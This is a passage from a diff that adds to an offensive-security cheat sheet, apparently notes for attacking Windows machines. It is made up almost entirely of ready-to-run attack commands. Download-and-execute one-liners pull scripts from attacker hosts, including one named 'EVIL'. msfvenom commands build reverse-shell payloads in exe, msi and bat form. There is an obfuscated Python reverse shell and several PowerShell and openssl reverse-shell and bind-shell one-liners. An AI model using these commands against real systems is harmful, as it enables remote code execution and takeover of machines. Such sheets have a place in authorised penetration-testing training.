+						echo strBuffer = "" >> wget.vbs
+						echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+						echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+						echo Next >> wget.vbs
+						echo ts.Close >> wget.vbs
+					Usage:
+						cscript wget.vbs http://ip/filename savename
+			B. Powershell:
+				1. powershell -c (New-Object Net.WebClient).DownloadFile('http://ip/filename', 'savename')
+					(New-Object Net.WebClient).DownloadFile('http://ip/filename', 'savename') => same as above
+				2. powershell IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename')
+					IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename') => same as above
+					Note:
+						IEX or iex are the same thing
+					Note:
+						This command is used when we wanna automatically exploit powershell scripts.
+				3. powershell iwr -Uri <source> -OutFile <destination> -UseBasicParsing
+					Note:
+						Invoke-WebRequest or IWX or iwx are the same thing
+				4. powershell.exe iex (iwr http://ip/file -usebasicparsing) 
+					Note:
+						This command is used when we wanna automatically exploit powershell scripts.				
+				5.cURL:
+					Installed by default in Win 10 v1803+
+					Usage:
+						curl http://server/file -o file
+						curl http://server/file.bat | cmd
+						IEX(curl http://server/script.ps1);<name_of_module>
+				6. Using BitsTransfer:
+					a. Import-Module BitsTransfer
+					b. Now, we have two choices:
+						1.Start-BitsTransfer -Source $url -Destination $output
+						2.Start-BitsTransfer -Source $url -Destination $output -Asynchronous
+				7. wget.ps1:
+					code:
+						echo $storageDir = $pwd >> wget.ps1
+						$webclient = New-Object System.Net.WebClient >> wget.ps1
+						# Download file from
+						$url = "http://<ip>/file_name" >> wget.ps1
+						# Save file as
+						$file = "file_name"
+						echo $webclient.DownloadFile($url,$file) >>wget.ps1
+					usage:
+						powershell.exe -nop -ep bypass -nol -noni -f wget.ps1
+				8. Using WinHTTP Com Object:
+					[System.Net.WebRequest]::DefaultWebProxy
+					[System.Net.CredentialCache]::DefaultNetworkCredentials
+					$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText	
+Windows Payloads:
+	Note:
+		We can either transfer file or use SMB to call file from kali
+	A. .exe:
+		Types:
+			x86:
+				msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.201 LPORT=4444 -f exe -o shell.exe
+			x64:
+				msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.201 LPORT=4444 -f exe -o shell.exe
+		Usage:
+			CMD> file.exe
+			PS> cmd /c file.exe
+	B. .msi:
+		Types:
+			x86:
+				msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.201 LPORT=4444 -f msi -o shell.msi
+			x64:
+				msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.201 LPORT=4444 -f msi -o shell.msi
+		Usage:
+			CMD> msiexec /quiet /i \\kali_ip\shell.msi
+			CMD> msiexec /quiet /i shell.msi
+	C. .bat:
+		msfvenom -p CMD/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
+		CMD>shell.bat
+		CMD> \\kali_ip\shell.bat
+	D. .vbs:
+		https://github.com/cym13/vbs-reverse-shell.git
+			kali> python3 server.py
+			windows> powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
+	E. .DLL:
+		Read DLL Exploitation Sheet
+	F. .bin:(Binary)
+		Using msfvenom:
+			msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
+		Using Donut.exe:(https://github.com/TheWover/donut)
+			Basics:
+				https://thewover.github.io/Introducing-Donut/
+			Usage:
+				Flags:
+	G. .ps1:
+		Using Nishang:
+			nishang/shells/Invoke-PoweshellTcp.ps1:
+				Edit it:
+					Append in it:
+						Invoke-PoweshellTcp -Reverse -IPAddress tun0 -port 5566
+				Note:
+					DONT USE nishang/shells/invoke-PowerShellTcpOneLine.ps1
+			Note:
+				We need to transfer script.ps1 in a powershell shell which can execute scripts(-exec bypass), using IEX method as it will execute on its own after downloading.
+	H. .py:
+		To check if we have python in windows:
+		Types:
+			1. Python2:
+				CMD>C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\CMD.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+				Note:
+					change ip and port accordingly
+			2. Python3:
+Reverse Shells:
+	A. Using Payloads and nc/socat/powercat to catch them
+	B. Using openssl:(if we have openssl in windows)
+		kali> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes => generate keys
+		kali> openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT> => attacker
+		victim> openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> | CMD.exe
+	C. Powershell one-liners:
+		Basics:
+		`Read "CMD and PS Usage For Windows Exploitation" Section
+		Types:(2)
+			1. Reverse Shell:(connecting to a listener port)(3 Types)
+				A.
+					powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+				B.
+					powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+				C.
+					powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://ip/Invoke-PoweshellTcp.ps1')
+			2. Bind Shell:(listening on a port)
+				A. 
+					powershell -nop -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+Lateral Movement:
+	Read Lateral Movement and Pivoting Sheet
